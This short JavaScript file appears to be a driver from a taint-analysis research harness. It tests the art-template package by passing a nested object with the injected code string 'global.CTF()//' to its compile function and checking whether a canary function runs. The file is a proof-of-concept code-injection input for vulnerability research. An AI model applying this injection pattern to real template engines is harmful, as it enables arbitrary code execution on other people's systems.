// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/art-template/node_modules/art-template');
global.CTF = function() {console.log("GLOBAL.CTF HIT")}
try {
	var x0 = {"source":{"source":{"source":{"value":{"value":"global.CTF()//"}}}}};
new PUT["compile"](x0)();
} catch (e) {
	console.log(e);
}